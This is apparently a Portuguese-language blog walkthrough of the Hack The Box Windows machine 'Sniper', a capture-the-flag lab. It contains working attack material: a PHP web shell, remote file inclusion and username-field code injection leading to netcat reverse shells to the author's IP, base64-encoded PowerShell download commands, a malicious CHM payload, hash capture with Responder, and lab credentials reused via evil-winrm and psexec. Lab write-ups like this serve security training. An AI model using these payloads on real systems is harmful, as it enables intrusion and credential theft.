---
title: "Hack The Box - Sniper"
tags: [Windows,Medium,Gobuster,Burpsuite,Impacket,Nishang,Port Forwading,Brute Force,Psexec]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/211>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

Nmap normal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta (Não vou rodar essa flag pq teve uma saída bem bizarra)

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 4 portas abertas no servidor

> Porta 80 - Servidor Web

> Portas 139, 135 e 445 - Servidor Samba

## Enumeração da Portas 80

Por se tratar de um servidor web, a primeira coisa que fazemos é acessar ele pelo navegador

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_web.png)

Vamos prosseguir

### Gobuster na porta 80

O próximo passo de qualquer reconhecimento web é rodar o Gobuster na máquina para podermos verificar os resultados

> gobuster dir -u http://10.10.10.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_gobuster.png)

Bom encontramos vários endereços... vamos iniciar e enumeração dos mais interessantes `/user` e `/blog`

#### /user

Acessando a página do /user encontramos a seguinte interface

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_web1.png)

Bom, como ainda não temos nenhuma credencial, não creio que iremos utilizar isso ainda

#### /blog

Esse nos pareceu um pouco mais promissor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_web2.png)

Clicando em `Languages` nos pareceu ter algum tipo de LFI, bem na cara...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_web3.png)

```
http://10.10.10.151/blog?lang=blog-en.php
http://10.10.10.151/blog?lang=blog-es.php
http://10.10.10.151/blog?lang=blog-fr.php
```

A página pelo visto está vazendo um LFI no mesmo dirrótio que se encontra, podemos "deduzir" que a requisição se comporta da seguinte forma

`include $_GET['lang'];`

Bom, por enquanto vamos prosseguir, como boa prática vamos mandar tudo para o BurpSuite para melhor explorar (fica mais palpável)

## LFI

Primeiro iremos explorar o LFI que temos nessa página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_burp1.png)

Mandamos para o `Repeater`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_burp2.png)

Não conseguimos inserir páginas da própria pasta web, mas do sistema conseguimos, já é alguma coisa. Temos como exemplo o `\windows\win.ini`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_burp3.png)

Bom, com o LFI não vamos conseguir muita coisa, o que nos realmente interessa é o RFI que temos nessa página

## RFI

Temos um RFI nessa máquina também, mas creio que esse não era o modo planejado pelo cara que fez a máquina, mas é interessante exploramos também!

Primeira coisa a se testar/verificar é se conseguimos algum tipo de conexão com a máquina, ou seja, se conseguimos fazer a máquina buscar algo em nosso servidor samba (para isso vou levantar um servidor samba)

Bom, então vamos tentar alguma conexão com a nossa máquina. Verificamos que temos sim, que ela tenta se conectar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba.png)

Então agora vamos tentar fazer ele pegar algum arquivo no nosso smb server. Criamos o arquivo `teste.txt`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba2.png)

`impacket-smbserver sniper $(pwd)`

Agora tentamos fazer a conexão, e vimos que ele alcança nossa máquina, mas não pega o arquivo nem nada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba1.png)

Teremos que mudar as configurações do servidor samba, pq o certo é ele pegar, ou pelo menos se autenticar no meu servidor. O arquivo de configuração do samba que devemos alterar é o `/etc/samba/smb.conf`

Adicionamos no final qual pasta ele deve procurar

```
[sniper]  
   comment = RCE
   path = /root/hackthebox/sniper/smb
   guest ok = yes
   browseable = yes
   writable = yes
   create mask = 0600
   directory mask = 0700
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba3.png)

Iniciamos o serviço

```
systemctl start smbd
service nmbd restart
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba4.png)

Agora com o serviço startado automaticamente, conseguimos fazer o RFI

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba5.png)

Show!

# Pegando Shell (1º Modo - Direto)

O primeiro modo e mais simples, é colocar um .php lá dentro que contém um cmd e executar direto através do BurpSuite

rce.php

`<?php system($_REQUEST['cmd']); ?>`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba6.png)

Agora executamos no Burp

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_samba7.png)

Pronto! Temos RCE. Bom aqui vamos fazer de dois modos, mas não era necessário vou fazer pra treinar mesmo

## 1º Modo - Nishang (Fail - Constrained Mode)

Primeiro modo é através do Nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis.png)

Aqui está o git dele, pra quem não conhece é um monte de ferramentas diferentes para pentest em windows, e temos vários reverse shell neles já

> https://github.com/samratashok/nishang

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis1.png)

Copiamos para nossa pasta e já fazemos as alterações necessárias (no caso jogamos para o final do arquivo a chamada para o reverse shell)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis3.png)

Agora vamos fazer ele se conectar e tentar me dar o reverse shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis4.png)

Ele tocou no meu smb server mas não me deu um reverse shell, isso se da possivelmente pq o powershell está em `Constrained Mode`, ou Modo Constrito, onde não deixa nos executarmos alguns comandos, para verificar isso, comprovar isso

`powershell $ExecutionContext.SessionState.LanguageMode`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis5.png)

Ai está... não iremos conseguir executar o IEX com esse modo, o que nos resta fazer é com o `nc.exe`

## 2º Modo - Netcat (Sucesso)

Bom, com o nc.exe fica mais fácil, e dá certo também

Copiamos o nc.exe para a pasta do samba

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis6.png)

Agora executamos ele e ganhamos o reverse shell

`GET /blog/?lang=\\10.10.16.126\\sniper\\rce.php&cmd=\\10.10.16.126\\sniper\\nc.exe+10.10.16.126+443+-e+powershell`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_nis7.png)

## 3º Modo - User.php

Outro modo, muito bacana de explorarmos é através da página de criação de usuários, podemos inserir códigos ali e sim, eles serão executados!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log.png)

A "vulnerabilidade" está no campo `Username`, mas como vamos explorar ela? Vamos criar um e-mail qualquer, no campo usuário, iremos inserir o código a ser executado em php, por exemplo, primeiro vamos fazer o mais simples, que é um `whoami`, apenas para testar RCE

```
<?=`whoami`?>
```

Criado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log1.png)

Agora logamos com o usuário criado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log2.png)

Bom, conseguimos logar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log3.png)

Verificamos o PHPSSESID da seção `i0c4ibv316j6d2tch953kmd4at`. O windows, por padrão salva por padrão os dados da seção no diretório `\Windows\Temp\sess_PHPSSEID`, então com o LFI que temos, podemos verificar o conteudo dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log4.png)

Ai está, temos RCE! Bom como sabemos que não podemos fazer um IEX, temos que dar um jeito de jogar o nc.exe lá pra dentro, e como conseguimos rodar comandos remotamente, isso ficou bem facilitado

Vamos deixar o comando em base64, pois ai corre menos o risco de acontecer algum erro na hora de ele executar. Nesse comando abaixo fazemos para ele baixar o nc.exe na minha máquina e salvar ele no diretório C:/Windows/Temp/nc.exe, o iconv é para converter para o formato de texto que o windows entende (linux e windows são diferentes, por isso se faz isso)

`echo wget 10.10.16.126/nc.exe -O C:/Windows/Temp/nc.exe | iconv -t UTF-16LE | base64 -w0`

> dwBnAGUAdAAgADEAMAAuADEAMAAuADEANgAuADEAMgA2AC8AbgBjAC4AZQB4AGUAIAAtAE8AIABDADoALwBXAGkAbgBkAG8AdwBzAC8AVABlAG0AcAAvAG4AYwAuAGUAeABlAAoA

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log5.png)

Agora no campo `Username` iremos colocar 

```
<?=`powershell /enc dwBnAGUAdAAgADEAMAAuADEAMAAuADEANgAuADEAMgA2AC8AbgBjAC4AZQB4AGUAIAAtAE8AIABDADoALwBXAGkAbgBkAG8AdwBzAC8AVABlAG0AcAAvAG4AYwAuAGUAeABlAAoA`?>
```

Ele irá interpretar o comando como base64 mesmo, desencodar e executar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log6.png)

Logamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log7.png)

Pegamos o PHPSSESID

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log8.png)

Pronto, fez o download

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log9.png)

Agora devemos fazer ele executar esse `nc.exe` e me dar um shell

`echo 'C:\Windows\Temp\nc.exe 10.10.16.126 443 -e powershell' | iconv -t UTF-16LE | base64 -w0`

> QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABuAGMALgBlAHgAZQAgADEAMAAuADEAMAAuADEANgAuADEAMgA2ACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAAoA

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log10.png)

Criamos nova conta com esse comando

```
<?=`powershell /enc QwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABuAGMALgBlAHgAZQAgADEAMAAuADEAMAAuADEANgAuADEAMgA2ACAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAAoA`?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log11.png)

Logamos e pegamos o PHPSSESID

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log13.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log14.png)

Executamos e ganhamos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_log15.png)

Bom, agora vamos prosseguir

# Escalando Privilégio (Iuser -> Chris)

Beleza, agora vamos iniciar a escalação de privilégio nessa máquina, o primeiro passo é nos tornarmos o usuário `Chris`

Dando uma volta pelos arquivos de configuração do servidor web, sempre é bom verificar ele quando entramos em uma máquina através da web encontramos um arquivo `db.php` que contém credenciais

`("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper")`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris.png)

## 1º Modo (Runas)

Primeiro modo de se fazer isso é através do runas

Aqui está a sequencia de comandos que utilizei. O primeiro deles é pra transformar a senha em Secure-String, o powershell por padrão não nos deixa digitar direto senhas, temos que converter ela. O segundo é pra montar o par user:senha. O terceiro para rodar o comando `whoami`, para testar se conseguimos ou não

```
PS C:\inetpub\wwwroot\user> $pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
PS C:\inetpub\wwwroot\user> $cred = New-Object System.Management.Automation.PSCredential("SNIPER\\Chris", $pass)
PS C:\inetpub\wwwroot\user> Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {whoami}
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris1.png)

Pegando um shell

`Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {\\10.10.16.126\\sniper\\nc.exe 10.10.16.126 443 -e powershell}`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris2.png)

Beleza!

## 2º Modo (Chisel - WinRM)

Sim, isso mesmo, através do chisel. A ideia aqui é fazermos um Port Forwading de portas e rodar localmente. Primeiro vamos ver quais portas estão sendo executadas localmente que podemos fazer alguma coisa com elas

`netstat -an`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris4.png)

Bom, verificamos duas de interesse, a 3306 que é do banco de dados, e a 5985, que podemos executar o WinRM nela... interessante...

Então baixamos o Chisel para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris5.png)

Baixamos a versão para o Linux (server)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris6.png)

E a versão para Windows (Client)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris8.png)

Mandamos a versão do client para a máquina Sniper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris7.png)

Setamos o servidor na Kali

`./chisel server -p 8000 --reverse`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris9.png)

Agora setamos no client para ser o socks, mais fácil do que fazer porta por porta

`.\chisel.exe client 10.10.16.126:8000 R:socks`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris10.png)

Se quisessemos fazer por a porta o comando seria esse, ai iriamos abrir as portas 3306 e 5985 na minha Kali, pra receber as conexões das duas portas que estão rodando localmente na Sniper

`.\chisel.exe client 10.10.16.126:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306`

Bom, tanto faz, as duas dão certo, o que devemos fazer agora, uma vez que escolhi o método do proxy socks, é arrumar o `proxychains.conf`

A porta padrão do proxychains é a 1080, e é a que o chisel usa também

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris11.png)

Agora nos conectamos no banco de dados da máquina Sniper

`proxychains mysql -h 127.0.0.1 -u dbuser -D sniper -p36mEAhz/B8xQ~2VM`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris12.png)

Encontramos um hash de admin da página web

`6e573c8b25e9168e0c61895d821a3d57`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris13.png)

Bom, mas aqui não tem muita coisa que podemos fazer com ele... então vamos prosseguir. A outra porta que temos aberta é a do WinRM, então podemos fazer login com o WinRM nesse máquina

`proxychains ruby evil-winrm.rb -u chris -p '36mEAhz/B8xQ~2VM' -i 127.0.0.1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_chris14.png)

Bom, agora vamos escalar para root

# Escalando Privilégio para Autority

Veriricando os arquivos que temos nas pastas do usuário, um nos chamou atenção

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv.png)

Ele comenta sobre preparar documentação para um website, na hora me meio a cabeça arquivos `.chm`, que são arquivos de help e html, verificando na pasta de Downloads do Chris temos um arquivo .chm

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv1.png)

Também temos diversos modos de se escalar privilégio nessa máquina, iremos fazer dois, um manual e outro automatizado. A ideia aqui é infectar um arquivo `.chm`, e com ele virar autority na máquina

## Automatizado - Nishang

O nishang possui um módulo específico que conseguimos fazer que ele armar arquivos .chm... Interessante! Pra quem não conheçe o nishang, fica a dica de pesquisar sobre ele, não vou postar agora por que lá em cima já coloquei o link dele. Após baixar ele para a máquina (git clone) entramos na pasta dele

Primeiro passo é importar o modulo `Out-CHM.ps1` (Aqui já estou na minha VM Windows 10 - Comando - Até da pra fazer pela Kali através do powershell mas da um monte de erro, então é mais prático e fácil fazer assim)

`Import-Module .\Out-CHM.ps1`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv2.png)

Agora é só criar o arquivo .chm malicioso. Mas por que essa pasta ai maluca? É pq é o endereço onde ficam os arquivos de "help" do windows

`Out-CHM -Payload "\windows\system32\spool\drivers\color\nc.exe -e cmd 10.10.16.126 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv3.png)

Agora passamos esse arquivo para a máquina Sniper

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv4.png)

Copiamos o nc.exe para a pasta `\windows\system32\spool\drivers\color\`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv6.png)

E agora o arquivo doc.chm para a pasta `C:\Docs`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv5.png)

Agora esperamos um tempo e recebemos o shell de autority

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_priv7.png)

## Manual - Criando o arquivo chm

Outro modo que iremos fazer essa máquina agora é criando o arquivo .chm, fazendo ele vir buscar um arquivo na minha Kali, e quando ele vier buscar vou estar com o `responder` ligado, e vou capturar o hash do administrador, quebrar ele, e entrar pelo `psexec.py` e pelo `winRM` através do tunel criado pelo chisel

Então vamos lá

Criamos primeiro um arquivo html, que servirá como base para se fazer o .chm

shell.html
```
<html>
<body>
<h1>Shell</h1>

<img src=\\10.10.16.126\\sniper\\shell.jpg />

</body>
</html>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man.png)

Agora acessamos a pasta `C:\Program Files (x86)\HTML Help Workshop`, onde está instalado o HTML Help Workshop (programa de se fazer chm). e abrimos o `hhw.exe` e já clicamos em `New`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man1.png)

Clicamos em `Project` Damos Next, até abrir o local onde quero que seja salvo o arquivo, ai eu salvo em `C:\Users\User\Desktop\shell.hhp`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man2.png)

Seleciono `HTML Files`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man3.png)

Seleciono o nosso `index.html`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man4.png)

Clicamos em `Compilar`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man5.png)

Ai está o arquivo compilado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man6.png)

Agora passamos esse arquivo para a máquina, antes teremos que dar stop no smbd server, uma vez que teremos que utilizar o `responder`

`systemctl stop smbd.service`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man7.png)

Passamos o arquivo para a máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man8.png)

Agora esperamos no responder para pegar as credenciais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man9.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man10.png)

`Administrator::SNIPER:1ca083be06015bca:C265A67C324D7FE13646A4488AA6C9A8:0101000000000000C0653150DE09D201AB727251CB7A0847000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000093EB78689D22901F7BEAA19D74A2224BED442034A465256790F0F1A3E9E2F4B00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310032003600000000000000000000000000`

Show... vamos quebrar esse hash agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man11.png)

`butterfly!#1     (Administrator)`

Bom, agora com a senha, ficou fácil

### 1º Modo - Powershell

Uma vez com a senha do administrador, podemos fazer direto, conseguir um login lá como foi feito antes com o chris

```
PS C:\Docs> $pass = ConvertTo-SecureString "butterfly!#1" -AsPlainText -Force
$pass = ConvertTo-SecureString "butterfly!#1" -AsPlainText -Force
PS C:\Docs> $cred = New-Object System.Management.Automation.PSCredential("SNIPER\\Administrator", $pass)
$cred = New-Object System.Management.Automation.PSCredential("SNIPER\\Administrator", $pass)
PS C:\Docs> Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {\\10.10.16.126\\sniper\\nc.exe 10.10.16.126 443 -e powershell}
Invoke-Command -ComputerName Sniper -Credential $cred -ScriptBlock {\\10.10.16.126\\sniper\\nc.exe 10.10.16.126 443 -e powershell}
```

E aqui está! (lembrar de ligar de novo o smbd)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man12.png)

### 2º Modo - Chisel - WinRM

Outro modo de se realizar isso é através do WinRM que temos pivoteado no chisel

proxychains ruby evil-winrm.rb -u administrator -p 'butterfly!#1' -i 127.0.0.1

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man13.png)

### 3º Modo psexec.py

Outro modo também é pelo psexec, que conseguimos um shell de administrador

`psexec.py administrator@10.10.10.151`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_man14.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-sniper/S_root.png)


